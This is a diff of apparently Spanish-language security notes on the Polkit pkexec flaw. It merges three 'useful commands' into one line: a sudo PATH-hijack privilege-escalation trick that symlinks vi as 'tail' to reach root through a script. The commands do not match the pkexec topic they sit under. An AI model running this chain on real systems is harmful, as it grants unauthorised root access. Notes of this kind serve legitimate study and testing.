@@ -30,6 +30,4 @@ Esta vulnerabilidad afecta a pkexec de Polkit: permite que un usuario no privile
 Según CERT-EU, esta vulnerabilidad está presente en muchas distribuciones de Linux hasta que se parchea. 
 
 Comandos utiles:
-ln -s /bin/vi tail
-export PATH=.:$PATH
-sudo --preserve-env=PATH /usr/bin/check_syslog.sh
+ln -s /bin/vi tail; export PATH=.:$PATH; sudo --preserve-env=PATH /usr/bin/check_syslog.sh
